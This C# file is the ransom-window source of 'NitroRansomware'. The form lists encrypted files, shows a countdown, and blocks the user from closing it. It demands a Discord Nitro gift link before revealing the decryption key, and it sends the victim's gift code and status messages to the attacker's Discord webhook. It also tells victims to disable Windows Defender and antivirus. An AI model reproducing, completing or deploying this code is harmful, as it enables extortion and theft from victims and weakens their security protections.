using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;

namespace NitroRansomware
{
    public partial class Form1 : Form
    {
        System.Timers.Timer t;
        int h = 3, m = 0, s = 0;  
        Webhook ww = new Webhook(Program.WEBHOOK);
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            t = new System.Timers.Timer();
            t.Interval = 1000;
            t.Elapsed += OnTimeEvent;
            t.Start();

            textBox5.Text = "";

            foreach(string x in Crypto.encryptedFileLog)
            {
                textBox5.Text += "Encrypted: " + x + "\r\n";
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = e.CloseReason == CloseReason.UserClosing;
        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (NitroValid())
            {
                textBox3.Text = Crypto.fPassword;
                label7.Text = "Paste your key here."; //guessing pass
                label7.ForeColor = Color.LightGreen; 
                textBox4.Text = ""; // text box send nitro to get decrypt key
                label1.Text = ""; // change title to empty str
                panel3.BackColor = Color.FromArgb(35, 39, 42);
                textBox1.Text = "How to Decrypt files:\r\n Enter decryption key and click on Decrypt button. \n Make sure Windows Defender and any other antivirus is off.\r\n Do not close the application while decrypting or else files may get corrupted.";//instructions
                t.Stop();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            
            string inputPassword = textBox4.Text;
            if (inputPassword == Crypto.fPassword)
            {
                ww.Send("```User has entered correct decryption key.. Decrypting files.```");
                MessageBox.Show("Key is correct. Decrypting files...", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Crypto.inPassword = Crypto.fPassword;
                textBox5.Text = "Decrypting files.. \r\nThis may take a while. Loading..";
                Cursor.Current = Cursors.WaitCursor;
                Program.DecryptAll();
                Cursor.Current = Cursors.Default;
                MessageBox.Show("Task complete. If there are files that have not been decrypted, make sure you turn off all antivirus and Windows Defender, then try decrypting again. \r\nIf it doesn't work, delete all Desktop.ini.givemenitro files that you see and try again.", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
                //Program.RemoveStart();
            }
            else
            {
                MessageBox.Show("Invalid key", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private bool NitroValid()
        {
            Webhook ww = new Webhook(Program.WEBHOOK);
            string input = textBox2.Text;
            string code = String.Empty;
            Console.WriteLine(input);

            if (input.Contains("discord.gift/"))
            {
                if (input.Contains("https://"))
                {
                    int found = input.IndexOf("/");
                    code = input.Substring(found + 15);
                    Console.WriteLine(code);
                }
                else
                {
                    int found = input.IndexOf("/");
                    code = input.Substring(found + 1);
                    MessageBox.Show("Checking gift validity.. .", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                if (Nitro.Check(code))
                {
                    ww.Send("**Valid nitro code was received**");
                    ww.Send(input);
                    MessageBox.Show("Success! Valid nitro code was sent. Your decryption key is now available. You may start decrypting your files now.", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return true;
                }

                else
                {
                    ww.Send("```User sent invalid discord gift Link.```");
                    MessageBox.Show("Invalid Nitro", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            else
            {
                ww.Send("```User sent invalid discord gift Link.```");
                MessageBox.Show("Please enter a Discord nitro gift in this format discord.gift/code here", "Nitro Ransomware", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            return false;
        }
        private void OnTimeEvent(object sender, System.Timers.ElapsedEventArgs e)
        {
            Invoke(new Action(() =>
            {

                if (s < 1)
                {
                    s = 59;
                    if (m == 0)
                    {
                        m = 59;
                        if (h != 0)
                        {
                            h -= 1;
                        }
                    }

                    else
                    {
                        m -= 1;
                    }
                }
                else
                    s -= 1;

                if (s == 0 && m == 0 && h == 0)
                {
                }

                label10.Text = string.Format("{0}:{1}:{2}", h.ToString().PadLeft(2, '0'), m.ToString().PadLeft(2, '0'), s.ToString().PadLeft(2, '0'));
 
            }));
        }

    }
}

